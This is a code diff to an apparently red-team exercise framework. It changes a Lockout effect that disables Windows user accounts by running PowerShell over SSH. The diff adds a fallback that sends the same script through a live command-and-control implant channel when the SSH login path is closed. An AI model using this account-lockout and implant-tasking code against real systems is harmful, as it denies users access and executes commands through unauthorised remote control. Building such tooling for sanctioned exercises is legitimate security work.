@@ -216,17 +216,41 @@ class Lockout(Effect):
                 "$x = Get-LocalUser -Name $u -ErrorAction SilentlyContinue; "
                 "if (-not $x) { 'N ' + $u } elseif ($x.Enabled) { 'U ' + $u } "
                 "else { 'L ' + $u } }")
+        script = f"{add}; {read}"
+        error = ""
         try:
             rc, out, err = ctx.ssh.ssh_ps(ip, fh["user"], fh.get("password") or "",
-                                          f"{add}; {read}", timeout=90,
+                                          script, timeout=90,
                                           key_path=fh.get("key_path"))
+            status = parse_status(out)
+            if status:
+                return status, ""
         except Exception as exc:
-            return None, f"lockout failed on {ip}: {type(exc).__name__}: {exc}"
-        status = parse_status(out)
-        if not status:
-            return None, (f"could not read the lock state back on {ip} (rc={rc}): "
-                          f"{(err or out or '').strip()[:200]}")
-        return status, ""
+            error = f"{type(exc).__name__}: {exc}"
+        # A Windows box's login path can close under us — the DC's Administrator is disabled by
+        # AD DS promotion, and a prior lockout of it does the same — while the C2 channel is
+        # live, so the lock falls back the way a takedown does (live: scrim-one in-window
+        # lockout, SSH reset by peer, and the tactics gate lost its only 4th tactic).
+        status = parse_status(self._via_channel(ctx, ip, script))
+        if status:
+            return status, ""
+        if error:
+            return None, f"lockout failed on {ip}: {error}"
+        return None, (f"could not read the lock state back on {ip} (rc={rc}): "
+                      f"{(err or out or '').strip()[:200]}")
+
+    @staticmethod
+    def _via_channel(ctx, ip, script):
+        """The same command through the live C2 channel; empty when there is no channel."""
+        c2 = getattr(ctx, "c2", None)
+        if c2 is None:
+            return ""
+        from .implant_channel import box_id_for
+        try:
+            outcome = c2.task(box_id_for(ctx, ip), script, timeout=120)
+        except Exception:
+            return ""
+        return str(outcome.get("output") or "") if outcome.get("ok") else ""
 
     def _records(self, ip, attempted, locked, windows):
         """(restore, artifact) for the accounts a lockout touched."""
